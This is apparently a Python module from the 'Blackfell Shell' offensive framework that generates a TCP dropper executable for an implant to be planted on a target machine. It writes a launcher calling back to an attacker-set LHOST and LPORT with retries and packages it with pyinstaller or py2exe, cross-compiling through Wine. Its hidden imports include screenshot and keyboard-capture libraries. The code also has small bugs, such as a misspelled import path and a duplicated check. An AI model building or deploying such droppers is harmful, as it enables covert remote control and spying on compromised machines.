#!/usr/bin/python3

import time
import os, sys
import pyscreenshot
import pynput

from resources.droppers import bs_tcp as dropper
from common import module as mod
from common import bcolors as bc

class BSModule(mod.BSModule):
    """BShell module class, inherited for all modules run via BShell"""
    def __init__(self, parent_menu):
        super().__init__()
        #module atts
        self.parent_menu = parent_menu
        self.root_menu = parent_menu.root_menu
        self.description = '''
        TCP Dropper for the Blackfell Shell implant. Creates an exeutable file for you to drop on the target.
        '''
        #List YOUR class setup & attributes here
        self.add_setting('LHOST', self.root_menu.global_options['LHOST'], True)
        self.add_setting('LPORT', 443, True)
        self.add_setting('listener', None, False)
        self.add_setting('out_dir', "generated/", True)
        self.add_setting('filename', "drop_me", True)
        self.add_setting('py2exe', False, True)
        self.add_setting('pyinstaller', True , True)
        self.add_setting('platform', None, True)
        self.add_setting('connect_retries', 100, True)
        self.src_dir = 'src/'
        self.bin_dir = 'bin/'
        #Pyinstaller hidden imports
        hidden_imports =  ['os', 'sys', 'subprocess', 'PIL', 'pyscreenshot',\
                                'packaging.requirements', 'resources.doppers.bs_tcp'\
                                'pkg_resources.py2_warn', 'pynput', 'threading',
                                 'Crypto']
        self.hidden_imports = ''
        for imp in hidden_imports:
            self.hidden_imports += ' --hidden-import={}'.format(imp)

    def setup(self):
        """Configures and tests the module, anything that sanity checks
        user input can be put in here."""

        #First configure LHOST and LPORT from listener
        try:
            self.set_option('LPORT', int(self.get_option('LPORT')))
        except:
            bc.err("LPORT invalid - must be integer. Cannot autoconvert.")
            return False
        #LHOST
        try:
            self.set_option('LHOST', str(self.get_option('LHOST')))
        except:
            bc.err("LHOST invalid - must be integer. Cannot autoconvert.")
            return False
        #Check out directory - should only need to be created once
        if not os.path.exists(self.get_option('out_dir')):
            try:
                os.makedirs(self.get_option('out_dir'))
                bc.info("Output directory created : {}".format(self.get_option('out_dir')))
            except:
                bc.err("Could not read or create out_dir : {}. Is it a valid directory?.".format
                        (self.get_option('out_dir')))
                return False
        #Setup the source dirs - different for each dropper
        self.base_dir = self.get_option('out_dir') + self.get_option('filename') + '/'
        #Check if file already exists
        test_dir = self.base_dir[:-1]
        i=1
        while True:
            if os.path.isdir(test_dir):
                new_test_dir = self.base_dir[:-1] + str(i)
                i+=1
                bc.warn("{} already exists, trying to place in {}".format(test_dir, new_test_dir))
                test_dir = new_test_dir
            else:
                break
        self.base_dir = test_dir + '/'
        self.src_dir = self.base_dir + self.src_dir
        self.bin_dir = self.base_dir + self.bin_dir
        #Now make the dirs
        for d in [self.base_dir, self.src_dir, self.bin_dir]:
            if not os.path.isdir(d):
                os.makedirs(d)
                bc.info("Created : {}".format(d))
        #Check boolean settings
        if not self.check_bool('py2exe'):
            return False
        if not self.check_bool('py2exe'):
            return False
        if not self.check_bool('exit_on_exec'):
            return False
        if (self.get_option('py2exe') and self.get_option('pyinstaller'))\
                or ((not self.get_option('py2exe')) and (not self.get_option('pyinstaller'))):
            bc.warn("You must pick either py2exe or pyinstaller\n py2exe : {} Pyinstaller: {}".format(
                    self.get_option('py2exe'), self.get_option('pyinstaller')))
            return False

        #Check platform
        if self.get_option('platform').lower() not in [ 'windows', 'linux']:
            bc.warn("Platform {} invalid. Pick 'linux' or 'windows'.".format(
                    self.get_option('platform')))
            return False

        return True

    def run(self):
        """Main module code, called when the module is executed
        This module prints user provided messages to the console"""

        #Override with what to do with this class when it runs
        exit_on_exec, LHOST, LPORT, listener, out_dir, filename, py2exe, pyinstaller, \
                platform, retries = [i['value'] for i in self.options.values() ]
        #Get code for our dropper and put it in some source files
        src = []
        src.append("print('hello, world')")
        src.append("from resources.droppers import bs_tcp as d")
        src.append("drp = d.BSDropper('{}', {})".format(LHOST, LPORT))
        src.append("drp.retries = {}".format(retries) )
        src.append("drp.run()" )

        #Write source file
        src_filename = self.src_dir + self.get_option('filename') + '.py'
        #Write source file
        with open(src_filename, 'w') as s:
            for line in src:
                s.write(line + '\n')
        #Write temp file to work on
        with open('tmp.py', 'w') as s:
            for line in src:
                s.write(line + '\n')

        #Cross compile options first
        #Rule out py2exe on linux - not required but belt and braces
        if py2exe and platform.lower() == 'linux':
            bc.err("Py2exe does not support Linux. Sorry.")
            return False

        #Linux to windows first
        if sys.platform == 'linux' and platform.lower() == 'windows':
            if py2exe:
                if not self.py2exe_linux_2_win(LHOST, LPORT, out_dir, filename):
                    bc.err("Failed to compile with py2exe. Check setup instructions for Wine on Python 3.4")
                    return False
                else:
                    bc.success("Complied with py2exe!")
            elif pyinstaller:
                if not self.pyinstaller_linux_2_win(LHOST, LPORT, out_dir, filename):
                    bc.err("Failed to compile with pyinstaller. Check setup instructions for Wine on Python.")
                    return False
                else:
                    bc.success("Complied with pyinstaller!")

        #Now Windows to linux
        elif sys.platform == 'win32' and platform.lower() == 'linux' and pyinstaller:
            if pyinstaller:
                if not self.pyinstaller_win_2_linux(LHOST, LPORT, out_dir, filename):
                    bc.err("Failed to compile with py2exe. Check setup instructions for Ubuntu on WSL.")
                    return False
                else:
                    bc.success("Complied with pyinstaller!")

        #Otherwise it's homogeneous compilation
        elif (sys.platform == 'linux' and platform.lower() == 'linux') or (
                sys.platform == 'win32' and platform.lower() == 'windows'):
            if py2exe and sys.platform == 'windows':
                if not self.py2exe_same_same(LHOST, LPORT, out_dir, filename):
                    bc.err("Failed to compile with py2exe.")
                    return False
                else:
                    bc.success("Complied with py2exe!")
            elif pyinstaller:
                if not self.pyinstaller_same_same(LHOST, LPORT, out_dir, filename):
                    bc.err("Failed to compile with pyinstaller.")
                    return False
                else:
                    bc.success("Complied with pyinstaller!")

        #Maybe there's something else
        else:
            bc.err("No valid install options for platform : {}".format(platform))
            return False
        os.remove('tmp.py')
        #Notify the user what we did.
        bc.info("Dropper files available at {}".format(self.base_dir))



        if self.get_option('exit_on_exec'):  #Add success criteria - we want to stay in if fail
            return True
        else:
            return False

    def set_option(self, opt, val):
        """Set option method overridden to allow special actions for
        the listener, pyinstaller and py2exe options"""

        if opt == 'listener':
            l = None
            for l in self.root_menu.listeners:
                if l.name == val:
                    lnr = l
            if not l:
                return False
            self.options['LHOST']['value'] = lnr.LHOST
            self.options['LPORT']['value'] = lnr.LPORT
        if opt == 'py2exe':
            bc.warn("Py2exe is not currently supported, fixes coming soon.")
            self.options['pyinstaller']['value'] = 'False'
        if opt == 'pyinstaller':
            self.options['py2exe']['value'] = 'False'
        return super().set_option(opt,val)

    ################################ HELPERS #################################

    def py2exe_linux_2_win(self, LHOST, LPORT, out_dir, filename):
        src = []
        src.append("from distutils.core import setup")
        src.append("import py2exe")
        src.append("print('about to run setup')")
        src.append("setup(console=['{}'])".format(self.src_dir + filename + '.py'))
        #src.append("setup(console=['{}'])".format(filename + '.py'))
        with open(self.src_dir + 'setup.py', 'w') as s:
            for line in src:
                s.write(line + '\n')
        #Nopw compile dat file
        try:
            command = "wine py -3.4 {} py2exe".format(self.src_dir + 'setup.py')
            os.system(command)
        except:
            bc.err("Could not cross compile for windows")
            return False
        return True

    def pyinstaller_linux_2_win(self, LHOST, LPORT, out_dir, filename):
        try:
            #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
            command = "wine pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
                    --specpath {} {} -n {} {}".format(\
                    self.bin_dir, self.src_dir, self.src_dir,self.hidden_imports, \
                     filename  , 'tmp.py')
            os.system(command)
            output = ''
            if 'pyinstaller: error' in output:
                bc.err("Could not cross compile for windows:\n{}".format(output))
                return False
        except:
            bc.err("Could not cross compile for windows")
            return False
        return True

    def pyinstaller_same_same(self, LHOST, LPORT, out_dir, filename):
        try:
            #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
            command = "pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
                    --specpath {} {} -n {} {}".format(\
                    self.bin_dir, self.src_dir, self.src_dir,self.hidden_imports, \
                     filename  , 'tmp.py')
            os.system(command)
            output = ''
            if 'pyinstaller: error' in output:
                bc.err("Could not compile :\n{}".format(output))
                return False
        except:
            bc.err("Could not do straight pyinstaller compile")
            return False
        return True

    def py2exe_same_same(self, LHOST, LPORT, out_dir, filename):
        bc.err("Py2Exe not yet supported.")
        return False
        src = []
        src.append("from distutils.core import setup")
        src.append("import py2exe")
        src.append("print('about to run setup')")
        src.append("setup(console=['{}'])".format(self.src_dir + filename + '.py'))
        #src.append("setup(console=['{}'])".format(filename + '.py'))
        with open(self.src_dir + 'setup.py', 'w') as s:
            for line in src:
                s.write(line + '\n')
        #Nopw compile dat file
        try:
            command = "py -3.4 {} py2exe".format(self.src_dir + 'setup.py')
            os.system(command)
        except:
            bc.err("Could not cross compile for windows")
            return False
        return True


    def pyinstaller_win_2_linux(self, LHOST, LPORT, out_dir, filename):
        try:
            #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
            command = "pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
                    --specpath {} {} -n {} {}".format(\
                    self.bin_dir, self.src_dir, self.src_dir,self.hidden_imports, \
                     filename  , 'tmp.py')
            os.system(command)
            output = ''
            if 'pyinstaller: error' in output:
                bc.err("Could not compile :\n{}".format(output))
                return False
        except:
            bc.err("Could not cross compile for windows")
            return False
        return True


def main():
    print("You're running the bs_tcp listener  module as main, did you mean to?")

if __name__ == '__main__':
    main()
